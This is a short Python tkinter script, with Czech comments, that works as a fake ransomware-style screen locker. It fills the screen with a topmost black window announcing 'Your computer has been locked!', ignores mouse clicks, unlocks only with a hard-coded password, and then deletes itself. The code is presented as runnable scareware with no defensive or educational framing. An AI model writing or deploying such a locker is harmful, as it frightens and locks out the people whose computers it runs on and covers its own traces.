import tkinter as tk
from tkinter import simpledialog, messagebox
import os
import sys

# Nastavení hesla
PASSWORD = "password123"

def lock_screen():
    """Zamkne obrazovku tím, že zobrazí zprávu na celé obrazovce."""
    def check_password():
        """Ověří, zda je zadané heslo správné."""
        entered_password = password_entry.get()
        if entered_password == PASSWORD:
            messagebox.showinfo("Unlock", "Password is correct! Unlocking...")
            root.destroy()
            os.remove(__file__)  # Odstraní tento skript
            sys.exit()
        else:
            messagebox.showerror("Error", "Incorrect password. Try again.")
    
    root = tk.Tk()
    root.attributes("-fullscreen", True)
    root.attributes("-topmost", True)
    root.configure(bg='black')

    label = tk.Label(root, text="Your computer has been locked!\nEnter the password to unlock.", fg="red", bg="black", font=("Helvetica", 36))
    label.pack(pady=20)

    password_entry = tk.Entry(root, show='*', font=("Helvetica", 24))
    password_entry.pack(pady=20)
    password_entry.bind('<Return>', lambda event: check_password())  # Enable enter key for password check

    unlock_button = tk.Button(root, text="Unlock", command=check_password, font=("Helvetica", 24))
    unlock_button.pack(pady=20)

    root.bind_all("<Button-1>", lambda e: None)  # Ignoruje kliknutí myší
    

    root.mainloop()

if __name__ == "__main__":
    lock_screen()
